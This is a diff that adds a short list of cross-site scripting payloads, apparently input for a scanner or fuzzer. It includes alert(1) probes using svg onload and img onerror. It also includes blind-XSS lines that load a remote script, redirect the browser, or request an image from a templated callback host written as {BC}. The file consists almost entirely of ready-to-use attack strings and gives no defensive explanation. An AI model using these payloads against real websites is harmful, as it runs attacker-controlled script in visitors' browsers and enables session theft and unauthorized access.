@@ -1,0 +1,11 @@
+hhhhhhhhhhhhhhxss
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<script>$.getScript("//{BC}")</script>
+<script src=http://{BC}></script>
+<svg/oNLoAd=(document.location='http://{BC}')>
+"><svg/oNLoAd=(document.location='http://{BC}')>
+<img/src="http://{BC}">
+"><<img/src="http://{BC}">
+<img src="http://{BC}">
+
